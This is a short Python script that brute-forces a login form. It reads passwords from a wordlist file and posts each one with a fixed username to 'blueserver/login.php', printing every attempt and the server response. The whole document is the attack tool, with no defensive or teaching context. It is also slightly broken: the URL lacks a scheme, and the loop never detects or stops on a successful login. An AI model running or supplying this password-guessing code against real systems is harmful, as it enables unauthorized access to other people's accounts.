import requests

url = 'blueserver/login.php'
dictionary_path = 'passwords.txt'
username = 'user'

with open(dictionary_path, 'r') as file:
    password_list = file.readlines()

password_list = [password.strip() for password in password_list]

for password in password_list:
    credentials = {
        'user': username,
        'pass': password
    }

    response = requests.post(url, data=credentials)

    print(f'Attempted {username}:{password}', response)
